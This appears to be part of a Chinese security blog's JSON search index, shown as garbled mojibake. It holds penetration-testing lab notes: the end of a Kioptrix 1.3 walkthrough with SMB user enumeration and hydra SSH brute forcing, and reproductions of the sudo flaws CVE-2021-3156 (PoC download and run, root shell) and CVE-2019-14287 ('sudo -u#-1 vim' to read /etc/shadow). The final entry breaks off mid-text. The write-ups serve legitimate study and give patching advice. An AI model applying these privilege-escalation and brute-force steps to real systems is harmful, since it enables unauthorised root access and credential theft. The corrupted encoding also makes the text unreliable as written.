ç‰ˆæœ¬å·ï¼Œä½†æšä¸¾å‡ºç”¨æˆ·åï¼šrootã€robertã€johnã€loneferret ä½ ä»¥ä¸ºå°±è¿™æ ·ç»“æŸäº†ï¼Ÿ ç”¨æˆ·åä¹Ÿå¯é€šè¿‡ nmap è¿›è¡Œæšä¸¾ï¼šnmap -T4 --script=smb-enum-users 192.168.17.145 ![image-20230924210912765](kioptrix_level 1.3/image-20230924210912765.png) æ¥ç€ä½¬åˆæ‰§è¡Œå¦‚ä¸‹æ“ä½œ å°è¯•å¯¹å››ä¸ªè´¦æˆ·è¿›è¡Œ ssh æš´ç ´ï¼š hydra -L u.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt 192.168.146.132 ssh æš´ç ´å¤±è´¥ï¼Œæ­¤æ€è·¯ä»…ä¾›å‚è€ƒã€‚ è¿˜æœ‰ä¸€ç‚¹ï¼Œä¾¿æ˜¯åœ¨æ­¤ä¹‹å‰çš„sqlæ³¨å…¥æ¼æ´ä¸­ï¼Œæˆ‘ä»¬å°è¯•åœ¨ç”¨æˆ·åæˆ–è€…å¯†ç å¤„æ·»åŠ å•å¼•å·ä¼šå‘ç°é¡µé¢ä¼šæœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè¿™æ—¶å€™å°±åº”è¯¥æåº¦æ³¨æ„äº†ï¼Œä½†æˆ‘å´æ²¡æœ‰â”­â”®ï¹â”­â”® 0x05 æ–‡ç« æ€»ç»“ æ€»çš„æ¥è¯´ï¼Œåœ¨æ­¤æ¬¡é¶åœºä¸­æ€è·¯ä¾æ—§ç”¨ä¸Šä¸€ä¸ªé¶åœºï¼Œæ¡†æ¶å¹¶æ²¡å‘ç”Ÿå¤§çš„æ”¹å˜ï¼Œä½†ä»¤æˆ‘å°è±¡æ·±åˆ»çš„æœ‰ï¼š 1. å„ç§å·¥å…·çš„ä½¿ç”¨ï¼ˆéƒ½æœªè§è¿‡ï¼‰æ¯”å¦‚niktoæ¼æ‰«ï¼ŒSMBæœåŠ¡æšä¸¾å¤„ç”¨æˆ·åï¼Œç”šè‡³nmapä¹Ÿå¯ä»¥æšä¸¾ï¼Œå”‰è¿˜æ˜¯å¤ªèœï¼Œä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œæ¥ç€æµ…æµ…äº†è§£äº†ä¸€ä¸‹hydraçš„sshå¯†ç çˆ†ç ´ 2. è¿™é‡Œä¾¿æ˜¯ç½‘ç«™çš„æ‰‹å·¥æ¼æ´åˆ¤æ–­äº†ï¼Œè¿™æ¬¡ç»™æˆ‘çš„æ•™è®­æœ‰ï¼Œä¸€å®šä¸€å®šè¦å…³æ³¨ä»»ä½•ç™»å½•æ¡†ï¼Œå› ä¸ºä»–ææœ‰å¯èƒ½å­˜åœ¨sqlæ³¨å…¥ï¼Œå€˜è‹¥æ²¡æœ‰å‘ç°ï¼Œé‚£å¤§æ¦‚ç‡ä¹Ÿæ˜¯å› ä¸ºæˆ‘èœä¸ä¼šåˆ¤æ–­ï¼Œè€Œè¿™æ¬¡çš„sqlæ¼æ´ä¸­ï¼Œæ˜æ˜æˆ‘éƒ½æ‰‹å·¥æµ‹è¯•çš„æ—¶å€™çœ‹åˆ°äº†é¡µé¢çš„æŠ¥é”™ä¿¡æ¯ï¼Œä½†æˆ‘å´é€‰æ‹©æ— è§†ï¼Œå…¶å®è¿™å·²ç»è¯´æ˜äº†å­˜åœ¨sqlæ³¨å…¥ã€‚ 3. åŒæ—¶è¿™ä¹Ÿæœ‰åœ¨æç¤ºæˆ‘ï¼Œæœªæ¥è¦å­¦ä¼šå»æ­å»ºé…ç½®å±äºè‡ªå·±çš„å¼ºå¤§å­—å…¸ï¼Œä¸ç„¶å°±å­¦ä¼šåˆ©ç”¨å„ç§æ‰«æå·¥å…·æ¥é—´æ¥ä¸°å¯Œå­—å…¸å†…å®¹ã€‚ä¸è¿‡å‰è€…è‚¯å®šæ›´å®Œç¾ã€‚ 4. æœ€åä¾¿æ˜¯ä¸€äº›ææƒç±»çš„å†…å®¹ï¼Œè¿™ä»¤æˆ‘æœ‰ç‚¹å¤´ç–¼ï¼Œä½†å³ä½¿çŸ¥è¯†ä½“ç³»åºå¤§ï¼Œæˆ‘ä¹Ÿä¸å¯é€€ç¼©ï¼Œæ¯”å¦‚è¿™æ¬¡è¾¹äº†è§£åˆ°äº†ï¼Œå¦‚ä½•çªç ´å—é™åˆ¶çš„shellç¯å¢ƒã€ä»¥åŠmysqlçš„udfææƒã€‚è™½ç„¶æœ¬æ–‡æœªåšä»‹ç»ä½†æˆ‘ä¼šè®°å½•ä¸€ä¸‹å­¦ä¹ çš„æ–‡ç« ï¼Œåœ¨æ­¤ä¹‹åè¿›è¡Œå­¦ä¹ ã€‚ æˆ‘å°†åœ¨ä¸‹æ¬¡é¶åœºä¹‹å‰è¿›ä¸€æ­¥å­¦ä¹ udfææƒä»¥åŠé€ƒé€¸restricted shell 0x06 å‚è€ƒæ–‡ç«  æ¸—é€æŠ€å·§â€”â€”å¦‚ä½•é€ƒé€¸Linuxçš„å—é™åˆ¶shellæ‰§è¡Œä»»æ„å‘½ä»¤ CTFé¶åœºç³»åˆ—-Kioptrixå…¨é›† [CTFé¶åœºä¹‹Kioptrix: Level 1.3] Kioptrix: Level 1.3 --æåº¦æ¨è VulnHub â€“ Kioptrixï¼š1.3 çº§æ¼”ç»ƒ","tags":["å†…ç½‘é¶åœº"],"categories":["vulnhubç³»åˆ—"]},{"title":"CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°","path":"/2023/09/24/cve-2021-3156-sudo-ti-quan-lou-dong-fu-xian/","content":"0x01 æ¼æ´ç®€ä»‹ â€‹ Sudoæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å®ç”¨ç¨‹åºï¼Œå¤§å¤šæ•°åŸºäºUnixå’ŒLinuxçš„æ“ä½œç³»ç»Ÿéƒ½åŒ…å«Sudoã€‚å®ƒå…è®¸ç”¨æˆ·ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„å®‰å…¨ç‰¹æƒè¿è¡Œç¨‹åºã€‚2021å¹´1æœˆ27æ—¥ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶äººå‘˜æŠ«éœ²äº†Sudo å †ç¼“å†²åŒºæº¢å‡ºè‡´æœ¬åœ°ææƒæ¼æ´ï¼Œæ¼æ´ç¼–å·ä¸º CVE-2021-3156ã€‚ä»»ä½•æœ¬åœ°ç”¨æˆ·ï¼ˆåŒ…æ‹¬æ™®é€šç”¨æˆ·å’Œç³»ç»Ÿç”¨æˆ·ï¼Œsudoerå’Œésudoersï¼‰è‹¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯åœ¨æ— éœ€å¯†ç çš„æƒ…å†µä¸‹è·å¾—rootæƒé™ã€‚ äº§ç”ŸåŸç† ä¸€ä¸ªç±» Unix æ“ä½œç³»ç»Ÿåœ¨å‘½ä»¤å‚æ•°ä¸­è½¬ä¹‰åæ–œæ æ—¶å­˜åœ¨åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ å½“ sudo é€šè¿‡ -s æˆ– -i å‘½ä»¤è¡Œé€‰é¡¹åœ¨ shell æ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨ -s æˆ– -i æ ‡å¿—è¿è¡Œ sudoedit æ—¶ï¼Œå®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚åªè¦å­˜åœ¨ sudoers æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ /etc/sudoersï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨ sudo è·å¾—ç³»ç»Ÿ root æƒé™ã€‚ 0x02 å½±å“èŒƒå›´ Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 æµ‹è¯•ç³»ç»Ÿæ˜¯å¦æ˜“å—æ­¤æ¼æ´å½±å“ï¼š 1.ä»¥érootç”¨æˆ·èº«ä»½ç™»å½•ç³»ç»Ÿã€‚ 2.è¿è¡Œå‘½ä»¤â€œsudoedit -s /â€ 3.å¦‚æœå‡ºç°ä»¥â€œ sudoeditï¼šâ€å¼€å¤´çš„é”™è¯¯å“åº”ï¼Œåˆ™ç³»ç»Ÿå—åˆ°æ­¤æ¼æ´å½±å“ï¼› å¦‚æœå‡ºç°ä»¥â€œ usageï¼šâ€å¼€å¤´çš„é”™è¯¯å“åº”ï¼Œåˆ™è¡¨ç¤ºè¯¥æ¼æ´å·²è¢«è¡¥ä¸ä¿®å¤ã€‚ ![image-20230924105530740](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924105530740.png) æ€ä¹ˆè¯´ï¼Œæˆ‘è¿™ä¸ªåº”è¯¥ä¹Ÿæ˜¯å­˜åœ¨çš„å§ã€‚ã€‚ã€‚ã€‚ 0x03 æ¼æ´å¤ç° è¿™é‡Œé‡‡ç”¨kaliè¿œç¨‹ sshè¿æ¥ubuntuç³»ç»Ÿï¼Œä¸è¿‡ubuntuå¾—æå‰å¼€å¯22ç«¯å£ï¼Œå¼€å¯æ–¹æ³•å¯å‚è€ƒï¼šubuntuå¼€å¯22ç«¯å£ ![image-20230924110103036](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924110103036.png) æˆåŠŸé“¾æ¥ åœ¨æ™®é€šç”¨æˆ·æƒé™ä¸Šï¼Œè¾“å…¥ï¼šsudoedit -s / è¾“äº†æ‰å‘ç°ï¼Œubuntuæ²¡æ¼æ´ï¼Œfuckï¼Œæ¥ç€çœ‹äº†æˆ‘çš„centoså‘ç°å­˜åœ¨ã€‚ å‚è€ƒï¼šCentOS å¼€å¯22å·ç«¯å£ ![image-20230924110728825](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924110728825.png) æ¥ç€è¾“å…¥ä¸Šè¿°å‘½ä»¤ ![image-20230924110812687](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924110812687.png) å¦‚æœæ˜¾ç¤ºsudoedit: /: not a regular fileï¼Œåˆ™è¡¨ç¤ºè¯¥æ¼æ´å­˜åœ¨ ä¸‹è½½æ¼æ´pocï¼š https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz ![image-20230924111716439](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924111716439.png) è¿™é‡Œæˆ‘ç”¨çš„gitä¸‹è½½ ï¼Œä¸è¿‡è¿™å¾—çœ‹ç›®æ ‡æœºæ˜¯å¦æœ‰gitå‘½ä»¤ï¼Œå¦åˆ™çœ‹çœ‹èƒ½å¦ä½¿ç”¨wgetç­‰ç­‰ï¼Œæˆ–è€…å°è¯•ä¸‹è½½gitå‘½ä»¤ï¼ˆä¸è¿‡ä¸€èˆ¬å¾—æœ‰rootæƒé™æ‰å¯ä»¥ï¼‰ ä¸Šä¼ pocåˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œç»™äºˆæƒé™ï¼Œç„¶åæ‰§è¡Œ make &amp;&amp;./sudo-hax-me-a-sandwich 0 è¿™é‡Œåˆå‘ç°ä¸€å †æŠ¥é”™ï¼Œè§£å†³æ— æœåï¼Œè¿˜æ˜¯ç›´æ¥dockeræ‹‰å–ä¸€ä¸ªç¯å¢ƒç®—äº† ![image-20230924114457954](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924114457954.png) æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œæ¥ç€æ£€æµ‹æ¼æ´ ![image-20230924114523250](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924114523250.png) okï¼Œå­˜åœ¨æ¼æ´ï¼Œæ¥ç€ç”¨pocæ‰“ä¸€ä¸‹ ![image-20230924114709781](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924114709781.png) ![image-20230924114738607](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924114738607.png) ç”¨çš„æ˜¯idä¸º1000çš„testè´¦æˆ·æ‰§è¡Œexpï¼Œæ‰§è¡Œå®Œä¹‹åç”¨æˆ·æƒé™å·²ç»å˜æˆäº†rootï¼ŒæˆåŠŸææƒï¼Œåˆ°è¿™é‡Œæ‰€æœ‰çš„æ¼æ´å¤ç°å‡†å¤‡å·¥ä½œéƒ½åšå®Œäº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œæ¼æ´åˆ†æ ä¸è¿‡æ„Ÿè§‰è¿™ç§æ–¹å¼å°‘ç‚¹å‘³é“ï¼Œæ¥ä¸‹æ¥ä»‹ç»ä¸€ä¸‹æˆ‘ä¸Šè¿°å‡ºé—®é¢˜çš„é‚£ç§æ–¹æ³• ä¸Šä¼ pocåˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œç»™äºˆæƒé™ï¼Œç„¶åæ‰§è¡Œ make &amp;&amp;./sudo-hax-me-a-sandwich 0 ![image-20230924115108314](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924115108314.png) æœ‰#è¡¨ç¤ºæ¼æ´åˆ©ç”¨æˆåŠŸã€‚æŸ¥çœ‹æ˜¯å¦æ˜¯rootæƒé™ ![image-20230924115123776](CVE-2021-3156-sudo ææƒæ¼æ´å¤ç°/image-20230924115123776.png) 0x04 æ¼æ´æ€»ç»“ â€‹ æœ¬æ¼æ´åˆ©ç”¨æ‰‹æ³•æœ‰ä¸€å®šçš„å †å¸ƒå±€éš¾åº¦ï¼Œæœ€åçš„ææƒæ˜¯é€šè¿‡å †æº¢å‡ºè¦†ç›–nss_load_libraryå‡½æ•°åŠ è½½soçš„æ—¶å€™éœ€è¦ç”¨åˆ°çš„ç»“æ„ä½“service_userï¼Œè¦†ç›–æ­¤ç»“æ„ä½“ä¸­çš„soåå­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥è®©ç¨‹åºåŠ è½½æˆ‘ä»¬æŒ‡å®šçš„soæ–‡ä»¶ï¼Œä»è€Œå®Œæˆä»»æ„ä»£ç æ‰§è¡Œã€‚ 0x05 æ¼æ´ä¿®å¤ çœ‹ä¼¼è¯¥æ¼æ´å¾ˆniceï¼Œå…¶å®ä¾ç„¶éœ€è¦ä¸€å®šæƒé™æ‰§è¡Œmakeå‘½ä»¤ï¼Œä¸”åªå±å®³Ubuntuã€Debianç³»ç»Ÿï¼Œæˆ–è®¸æˆ‘ä¸Šè¿°çš„æŠ¥é”™å°±æ˜¯makeæ²¡æƒé™å§ã€‚ã€‚ã€‚ å»ºè®®åŠæ—¶å‡çº§sudoè‡³æœ€æ–°ç‰ˆæœ¬ã€‚ 0x06 å‚è€ƒæ–‡ç«  CVE-2021-3156æœ¬åœ°ææƒæ¼æ´å¤ç° CVE-2021-3156 æ¼æ´å¤ç°ç¬”è®° â€”æ¼æ´æºç åˆ†æå‚è€ƒ linuxä¸­sudoææƒæ¼æ´å¤ç°åŠä¿®å¤-CVE-2021-3156 CVE-2021-3156 sudo æœ¬åœ°ææƒæ¼æ´å¤ç° linux ææƒ-sudoææƒ","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"CVE-2019-14287ï¼šsudoæƒé™ç»•è¿‡æ¼æ´","path":"/2023/09/24/cve-2019-14287-sudo-quan-xian-rao-guo-lou-dong-fu-xian/","content":"0x01 æ¼æ´æ¦‚è¿° æœ‰çš„ç”¨æˆ·å¯èƒ½çŸ¥é“ï¼Œå¦‚æœå°†sudoé…ç½®ä¸ºå…è®¸ç”¨æˆ·é€šè¿‡Runasè§„èŒƒä¸­å®šä¹‰çš„ALLå…³é”®å­—æ¥ä»¥ä»»æ„ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤çš„è¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°†æœ‰å¯èƒ½é€šè¿‡åˆ¶å®šç”¨æˆ·ID -1æˆ–4294967295æ¥ä»¥rootæƒé™æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚ å®é™…ä¸Šï¼Œåªè¦ç”¨æˆ·çš„æƒé™è¶³å¤Ÿé«˜ï¼Œå³æ‹¥æœ‰æœ€é«˜sudoæƒé™çš„ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨Runasè§„èŒƒä¸­å®šä¹‰äº†ALLå…³é”®å­—çš„è¯ï¼Œä»–ä»¬å°±å¯ä»¥è¿è¡ŒRunasè§„èŒƒä¸­æ˜ç¡®ç¦æ­¢ä½¿ç”¨çš„é‚£äº›rootå‘½ä»¤ï¼Œè€Œä¸”ä»¥è¿™ç§æ–¹å¼è¿è¡Œçš„å‘½ä»¤å…¶æ—¥å¿—é¡¹æ‰€æ˜¾ç¤ºçš„ç›®æ ‡ç”¨æˆ·ä¸º4294967295ï¼Œè€Œä¸æ˜¯rootã€‚ä¸æ­¤åŒæ—¶ï¼Œåœ¨æ‰§è¡Œç›¸åº”å‘½ä»¤çš„è¿‡ç¨‹ä¸­ï¼ŒPAMä¼šè¯æ¨¡å—å°†ä¸ä¼šè¿è¡Œã€‚ Sudo çš„å…¨ç§°æ˜¯â€œsuperuserdoâ€ï¼Œå®ƒæ˜¯Linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸éœ€è¦åˆ‡æ¢ç¯å¢ƒçš„å‰æä¸‹ä»¥å…¶å®ƒç”¨æˆ·çš„æƒé™è¿è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚é€šå¸¸ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œæ˜¯ä¸ºäº†å‡å°‘ root ç”¨æˆ·çš„ç™»å½•å’Œç®¡ç†æ—¶é—´ï¼ŒåŒæ—¶æé«˜å®‰å…¨æ€§ã€‚ 2019å¹´10æœˆ14æ—¥ï¼ŒSudoå®˜æ–¹å‘å¸ƒäº†Sudo 1.8.28ç‰ˆæœ¬ï¼Œå…¶ä¸­åŒ…å«sudo rootæƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2019-14287ï¼‰çš„è¡¥ä¸ä¿®å¤ã€‚ 0x02 å½±å“èŒƒå›´ sudo 1.8.28 ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ 0x03 æ¼æ´åˆ†æ è¿™é‡Œå°±è·Ÿç€ä½¬çš„æ€è·¯èµ°ä¸€éï¼Œæ¸…æ¥šåŸç†å³å¯ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„Runasè§„èŒƒï¼ˆ/etc /sudoersï¼‰éƒ½å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­å®šä¹‰çš„ALLå…³é”®å­—å°†å…è®¸adminæˆ–sudoç»„ä¸­çš„ç”¨æˆ·ä»¥ç›®æ ‡ç³»ç»Ÿä¸­çš„ä»»æ„ç”¨æˆ·èº«ä»½æ¥è¿è¡Œå‘½ä»¤ï¼š å¦‚æœæƒ³åˆ©ç”¨è¯¥æ¼æ´æ¥å®æ–½æ”»å‡»ï¼Œç”¨æˆ·éœ€è¦æ‹¥æœ‰sudoæƒé™ï¼Œå¹¶å…è®¸ç”¨æˆ·ä½¿ç”¨ä»»æ„ç”¨æˆ·IDæ¥è¿è¡Œå‘½ä»¤ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™æ„å‘³ç€ç”¨æˆ·çš„sudoeré¡¹åœ¨Runasè§„èŒƒä¸­å®šä¹‰äº†ç‰¹æ®Šçš„ALLå€¼ã€‚ å¦‚æœsudoerç­–ç•¥å…è®¸çš„è¯ï¼Œsudoæ”¯æŒç”±ç”¨æˆ·æŒ‡å®šçš„ç”¨æˆ·åæˆ–ç”¨æˆ·IDæ¥è¿è¡Œå‘½ä»¤ã€‚æ¯”å¦‚è¯´ï¼Œä¸‹åˆ—sudoeré¡¹å…è®¸æˆ‘ä»¬ä»¥ä»»æ„ç”¨æˆ·çš„èº«ä»½æ¥è¿è¡Œidå‘½ä»¤ï¼Œå› ä¸ºåœ¨Runasè§„èŒƒä¸­å®ƒåŒ…å«äº†ALLå…³é”®å­—ã€‚ alice myhost = (ALL) /usr/bin/id é™¤äº†ä»¥ä»»æ„æœ‰æ•ˆç”¨æˆ·çš„èº«ä»½è¿è¡Œidå‘½ä»¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½å¤Ÿä»¥ä»»æ„ç”¨æˆ·IDæ¥è¿è¡Œè¯¥å‘½ä»¤ï¼Œæ­¤æ—¶éœ€è¦ä½¿ç”¨#uidè¯­å¥ï¼š sudo -u#1234 id -u è¯¥å‘½ä»¤å°†è¿”å›â€œ1234â€ã€‚ä½†æ˜¯ï¼Œsudoå¯ä»¥ä½¿ç”¨setresuid(2)å’Œsetreuid(2)è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ¥åœ¨å‘½ä»¤è¿è¡Œä¹‹å‰ä¿®æ”¹ç”¨æˆ·IDï¼Œå¹¶å°†ç”¨æˆ·IDä¿®æ”¹ä¸º-1ï¼ˆæˆ–æœªç­¾åçš„ç­‰ä»·ç”¨æˆ·ID-4294967295ï¼‰ï¼š sudo -u#-1 id -u æˆ– sudo -u#4294967295 id -u ä¸Šè¿°å‘½ä»¤è¿è¡Œä¹‹åï¼Œå°†è¿”å›â€œ0â€ã€‚è¿™æ˜¯å› ä¸ºsudoå‘½ä»¤æœ¬èº«å·²ç»åœ¨ä»¥ç”¨æˆ·IDâ€œ0â€è¿è¡Œäº†ï¼Œæ‰€ä»¥å½“sudoå°è¯•å°†ç”¨æˆ·IDä¿®æ”¹ä¸ºâ€œ-1â€æ—¶ï¼Œä¸ä¼šå‘ç”Ÿä»»ä½•å˜åŒ–ã€‚ ä½†æ˜¯ï¼Œsudoæ—¥å¿—æ¡ç›®ä¸­è®°å½•ä¸‹çš„å‘½ä»¤è¿è¡Œç”¨æˆ·çš„IDä¸ºâ€œ4294967295â€ï¼Œè€Œå¹¶érootç”¨æˆ·ï¼ˆæˆ–ç”¨æˆ·IDä¸ºâ€œ0â€ï¼‰ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå› ä¸ºç”¨æˆ·IDæ˜¯é€šè¿‡-ué€‰é¡¹æŒ‡å®šçš„ï¼Œå¹¶ä¸”ä¸ä¼šåœ¨å¯†ç æ•°æ®åº“ä¸­å­˜å‚¨ï¼Œæ‰€ä»¥PAMä¼šè¯æ¨¡å—ä¹Ÿä¸ä¼šè¿è¡Œã€‚ å¦‚æœsudoeræ¡ç›®å…è®¸ç”¨æˆ·ä»¥ä»»æ„ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼ˆérootï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ¥ç»•è¿‡è¿™ç§é™åˆ¶äº†ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æœ‰ä¸‹åˆ—sudoeræ¡ç›®ï¼š bob myhost = (ALL, !root) /usr/bin/vi ç”¨æˆ·bobèƒ½å¤Ÿä»¥é™¤äº†rootä¹‹å¤–çš„å…¶ä»–ä»»æ„ç”¨æˆ·èº«ä»½æ¥è¿è¡Œå‘½ä»¤viï¼Œä½†ç”±äºè¯¥æ¼æ´çš„å­˜åœ¨ï¼Œbobå®é™…ä¸Šèƒ½å¤Ÿé€šè¿‡ä¸‹åˆ—å‘½ä»¤æ¥ä»¥rootæƒé™è¿è¡Œviå‘½ä»¤ï¼Œå¹¶ç»•è¿‡ç›®æ ‡ç³»ç»Ÿä¸­çš„å®‰å…¨ç­–ç•¥ï¼š sudo -u#-1 vi åªæœ‰å½“åŒ…å«äº†ALLå…³é”®è¯çš„sudoeræ¡ç›®å­˜åœ¨äºRunasè§„èŒƒä¸­æ—¶ï¼Œè¯¥æ¼æ´æ‰å­˜åœ¨ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœè§„èŒƒä¸­åŒ…å«ä¸‹åˆ—sudoeræ¡ç›®çš„è¯ï¼Œç›®æ ‡ç³»ç»Ÿæ˜¯ä¸ä¼šå—åˆ°è¯¥æ¼æ´å½±å“çš„ï¼š alice myhost = /usr/bin/id åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œaliceåªèƒ½å¤Ÿä»¥rootæƒé™è¿è¡Œidå‘½ä»¤ï¼Œä»»ä½•ä»¥ä¸åŒèº«ä»½ç”¨æˆ·è¿è¡Œå‘½ä»¤çš„å°è¯•éƒ½å°†è¢«æ‹’ç»ã€‚ æ”»å‡»åœºæ™¯æˆªå›¾ï¼š 0x04 æ¼æ´å¤ç° è¿™é‡Œæˆ‘é‡‡ç”¨centosï¼Œå¾ˆå¹¸è¿ï¼Œæˆ‘çš„centoså­˜åœ¨å¦‚ä¸Šæ¼æ´ é¦–å…ˆæŸ¥è¯¢sudoç‰ˆæœ¬ï¼šsudo -V åˆ›å»ºç”¨æˆ· useradd test //åˆ›å»ºç”¨æˆ· passwd test //è®¾ç½®ç”¨æˆ·çš„å¯†ç  ç¼–è¾‘ä¸‹sudoersæ–‡ä»¶ è¿™é‡Œæ·»åŠ äº† hacker ALL=(ALL, !root) /usr/bin/vim è¿™é‡Œè¡¨ç¤º hacker å¯ä»¥åœ¨ä»»æ„ä¸»æœºä¸Šã€ä»»ä½•ç”¨æˆ·ï¼Œä½†è¿™ä¸ªç”¨æˆ·ä¸èƒ½å±äºrootç»„ï¼Œæ‰§è¡Œvimå‘½ä»¤ è¿™é‡Œä»‹ç»ä¸‹å­—æ®µå«ä¹‰ï¼š æˆæƒç”¨æˆ·/ç»„ ä¸»æœº=[(åˆ‡æ¢åˆ°å“ªäº›ç”¨æˆ·æˆ–ç»„)][æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç éªŒè¯] å‘½ä»¤1,å‘½ä»¤2 ç¬¬ä¸€ä¸ªå­—æ®µè¡¨ç¤ºï¼šæˆæƒç”¨æˆ·/ç»„&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ä¸ä»¥%å¼€å¤´çš„ï¼Œä»£è¡¨â€œå°†è¦æˆæƒçš„ç”¨æˆ·â€&nbsp;&nbsp;&nbsp;&nbsp; ä»¥%å¼€å¤´çš„è¡¨ç¤ºâ€œå°†è¦æˆæƒçš„ç»„â€ ç¬¬äºŒä¸ªå­—æ®µè¡¨ç¤ºï¼šå…è®¸ç™»å½•çš„ä¸»æœº ç¬¬ä¸‰ä¸ªå­—æ®µè¡¨ç¤ºï¼šå¯ä»¥åˆ‡æ¢åˆ°çš„ç”¨æˆ·æˆ–è€…ç»„ï¼Œçœç•¥è¡¨ç¤ºåˆ‡æ¢åˆ°rootã€‚&nbsp;&nbsp; å¦‚æœä¸çœç•¥éœ€è¦ç”¨æ‹¬å·è¡¨ç¤º&nbsp;&nbsp; (ç”¨æˆ·:ç»„) ç¬¬å››ä¸ªå­—æ®µè¡¨ç¤ºï¼šè‹¥æ·»åŠ NOPASSWDè¡¨ç¤ºä¸éœ€è¦è¾“å…¥å¯†ç ï¼Œå¦‚æœçœç•¥åˆ™è¡¨ç¤ºéœ€è¦è¾“å…¥å¯†ç  ç¬¬äº”ä¸ªå­—æ®µè¡¨ç¤ºï¼šå¯ä»¥è¿è¡Œçš„å‘½ä»¤ æˆ‘ä»¬ç”¨hackerç”¨æˆ·ç™»å½•ä¸‹cnetosï¼Œå¹¶å°è¯•è¯»å–shadowæ–‡ä»¶ ç„¶åæˆ‘ä»¬è¾“å…¥ sudo -u#-1 vim æˆ–è€… sudo -u#4294967295 vim è¿™é‡Œä¸çŸ¥ä¸ºä½•ç¿»è½¦äº†ï¼Œä¼°è®¡æ˜¯ç³»ç»Ÿé—®é¢˜ï¼Œè¿™é‡Œå…ˆå±•ç¤ºæˆåŠŸç”»é¢å§ è¿›å…¥åˆ°vimï¼Œåœ¨å‘½ä»¤æ¨¡å¼ä¸‹å°è¯•è¯»å–/etc/shadowæ–‡ä»¶ æˆåŠŸè¯»å–ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ç”¨vimæ‰§è¡Œå…¶ä»–çš„å‘½ä»¤ï¼ˆä»¥rootèº«ä»½ï¼‰ 0x05 æ¼æ´ä¿®å¤ 1.ä¹‹æ‰€ä»¥ä¼šäº§ç”Ÿè¿™ä¸ªæ¼æ´ï¼Œæ˜¯å› ä¸ºå°†ç”¨æˆ· ID è½¬æ¢ä¸ºç”¨æˆ·åçš„å‡½æ•°ä¼šå°† -1ï¼ˆæˆ–æ— æ•ˆçš„ 4294967295ï¼‰è¯¯è®¤ä¸ºæ˜¯ 0ï¼Œè€Œè¿™æ­£å¥½æ˜¯ root ç”¨æˆ· User ID 2.è¯·å°† sudo å‡çº§åˆ° 1.8.28 æœ€æ–°ç‰ˆæœ¬ï¼Œè¯¥æ¼æ´ä¼šå½±å“ 1.8.28 ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚ 0x06 å‚è€ƒæ–‡ç«  CVE-2019-14287ï¼šsudoæƒé™ç»•è¿‡æ¼æ´åˆ†æä¸å¤ç° CVE-2019-14287ï¼šsudo 